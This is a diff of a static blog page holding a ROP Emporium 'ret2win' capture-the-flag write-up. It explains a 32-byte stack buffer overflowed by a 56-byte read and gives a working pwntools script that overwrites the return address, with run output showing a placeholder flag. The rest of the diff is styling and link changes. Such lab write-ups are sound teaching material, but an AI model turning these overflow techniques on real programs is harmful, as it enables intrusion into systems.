+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x000000000040074e</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">102</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">call</span>   <span style="color:#f99b15">0x400550</span> <span style="color:#5bc4bf">&lt;</span><span style="color:#ef6155">puts@plt</span><span style="color:#5bc4bf">&gt;</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400753</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">107</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">nop</span>
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400754</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">108</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">leave</span>  
+   <span style="color:#ef6155">0</span><span style="color:#06b6ef">x0000000000400755</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">109</span><span style="color:#5bc4bf">&gt;</span>:	<span style="color:#ef6155">ret</span>    
+<span style="color:#06b6ef">End</span> <span style="color:#ef6155">of</span> <span style="color:#ef6155">assembler</span> <span style="color:#ef6155">dump.</span>
+</code></pre></div><p>From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size  32 bytes from the address of base pointer as shown in the stack diagram below.</p>
+<p><figure 
+	>
+	<a href="/post/ropemporium/stack.png" >
+		<img src="/post/ropemporium/stack.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>Therefore the next function is <strong>read</strong> function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we see we are reading 0x38 bytes from the user input and storing it in our buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">read(<span style="color:#f99b15">0</span>, <span style="color:#5bc4bf">*</span>[rbp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x20</span>], <span style="color:#f99b15">0x38</span>) <span style="color:#776e71">//0 is file descriptor stdin
+</span></code></pre></div><p>Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is <strong>ret2win</strong> function address.</p>
+<h2 id="exploit">Exploit</h2>
+<p>The exploit code for this ret2win function is,</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#5bc4bf">import</span> <span style="color:#fec418">pwn</span>
 
-pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>encoding <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;latin-1&#34;</span> 
-pwn<span style="color:#ff79c6">.</span>warnings<span style="color:#ff79c6">.</span>simplefilter(<span style="color:#f1fa8c">&#34;ignore&#34;</span>)
-pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>arch <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;amd64&#34;</span>
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>encoding <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;latin-1&#34;</span> 
+pwn<span style="color:#5bc4bf">.</span>warnings<span style="color:#5bc4bf">.</span>simplefilter(<span style="color:#48b685">&#34;ignore&#34;</span>)
+pwn<span style="color:#5bc4bf">.</span>context<span style="color:#5bc4bf">.</span>arch <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;amd64&#34;</span>
 
-io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>process(<span style="color:#f1fa8c">&#39;./ret2win&#39;</span>)
+io <span style="color:#5bc4bf">=</span> pwn<span style="color:#5bc4bf">.</span>process(<span style="color:#48b685">&#39;./ret2win&#39;</span>)
 
-payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">32</span> <span style="color:#6272a4"># fill the buffer</span>
-payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>  <span style="color:#6272a4">#overwrite saved base pointer</span>
-payload <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x400756</span>)  <span style="color:#6272a4">#Address of ret2win function</span>
-io<span style="color:#ff79c6">.</span>writeafter(<span style="color:#f1fa8c">&#39;&gt;&#39;</span>, payload)
+payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;A&#34;</span> <span style="color:#5bc4bf">*</span> <span style="color:#f99b15">32</span> <span style="color:#776e71"># fill the buffer</span>
+payload <span style="color:#5bc4bf">+=</span> <span style="color:#48b685">b</span><span style="color:#48b685">&#34;B&#34;</span> <span style="color:#5bc4bf">*</span> <span style="color:#f99b15">8</span>  <span style="color:#776e71">#overwrite saved base pointer</span>
+payload <span style="color:#5bc4bf">+=</span> pwn<span style="color:#5bc4bf">.</span>p64(<span style="color:#f99b15">0x400756</span>)  <span style="color:#776e71">#Address of ret2win function</span>
+io<span style="color:#5bc4bf">.</span>writeafter(<span style="color:#48b685">&#39;&gt;&#39;</span>, payload)
 
-pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</span>clean()<span style="color:#ff79c6">.</span>decode())
-</code></pre></div><p>running the script above we get the flag as shown below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vx@archie:ret2win$ python3 x.py 
-<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Starting <span style="color:#8be9fd;font-style:italic">local</span> process <span style="color:#f1fa8c">&#39;./ret2win&#39;</span>: pid <span style="color:#bd93f9">45427</span>
-<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span>  Thank you!
-    Well <span style="color:#ff79c6">done</span>! Here<span style="color:#f1fa8c">&#39;s your flag:
-</span><span style="color:#f1fa8c">    ROPE{a_placeholder_32byte_flag!}
-</span><span style="color:#f1fa8c">[*] Process &#39;</span>./ret2win&#39; stopped with <span style="color:#8be9fd;font-style:italic">exit</span> code <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">(</span>pid 45427<span style="color:#ff79c6">)</span>
+pwn<span style="color:#5bc4bf">.</span>info(io<span style="color:#5bc4bf">.</span>clean()<span style="color:#5bc4bf">.</span>decode())
+</code></pre></div><p>Running the script we get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vx@archie:ret2win$ python3 x.py 
+<span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Starting local process <span style="color:#48b685">&#39;./ret2win&#39;</span>: pid <span style="color:#f99b15">45427</span>
+<span style="color:#5bc4bf">[</span>*<span style="color:#5bc4bf">]</span>  Thank you!
+    Well <span style="color:#815ba4">done</span>! Here<span style="color:#48b685">&#39;s your flag:
+</span><span style="color:#48b685">    ROPE{a_placeholder_32byte_flag!}
+</span><span style="color:#48b685">[*] Process &#39;</span>./ret2win<span style="color:#ef6155">&#39;</span> stopped with exit code <span style="color:#f99b15">0</span> <span style="color:#5bc4bf">(</span>pid 45427<span style="color:#5bc4bf">)</span>
 </code></pre></div>
 </section>
 
@@ -204,13 +283,11 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
     
     <section class="article-tags">
         
-            <a href="/tags/ropemprium/">ropemprium</a>
+            <a href="/tags/ropemporium/">ropemporium</a>
         
             <a href="/tags/rop/">rop</a>
         
             <a href="/tags/pwn/">pwn</a>
-        
-            <a href="/tags/ctf/">ctf</a>
         
     </section>
 
@@ -221,6 +298,8 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
     
 </article>
 
+    
+
     <aside class="related-contents--wrapper">
     
     
@@ -229,21 +308,15 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
             <div class="flex article-list--tile">
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-split/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Split</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="">
+<article class="has-image">
     <a href="/p/return-oriented-programming-retcsu/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/retcsu.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/retcsu.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
@@ -253,37 +326,55 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
 </article>
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-pivot/">
+<article class="has-image">
+    <a href="/p/return-oriented-programming-write4/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/write4.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/write4.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Pivot</h2>
+            <h2 class="article-title">Return-Oriented Programming - Write4</h2>
         </div>
     </a>
 </article>
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-fluff/">
+<article class="has-image">
+    <a href="/p/return-oriented-programming-callme/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/callme.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/callme.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Fluff</h2>
+            <h2 class="article-title">Return-Oriented Programming - Callme</h2>
         </div>
     </a>
 </article>
                 
                     
-<article class="">
-    <a href="/p/return-oriented-programming-badchars/">
+<article class="has-image">
+    <a href="/p/return-oriented-programming-split/">
         
+        
+            <div class="article-image">
+                
+                    <img src="/post/ropemporium/split.jpg" loading="lazy" data-key="" data-hash="/post/ropemporium/split.jpg"/>
+                
+            </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Return-Oriented Programming - Badchars</h2>
+            <h2 class="article-title">Return-Oriented Programming - Split</h2>
         </div>
     </a>
 </article>
@@ -304,12 +395,12 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
         
             2020 - 
         
-        2021 Solar Bits
+        2022 Solar Bits
     </section>
     
     <section class="powerby">
         Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
     </section>
 </footer>
 
@@ -414,6 +505,7 @@ pwn<span style="color:#ff79c6">.</span>info(io<span style="color:#ff79c6">.</spa
                     <nav id="TableOfContents">
   <ol>
     <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#exploit">Exploit</a></li>
   </ol>
 </nav>
                 </div>
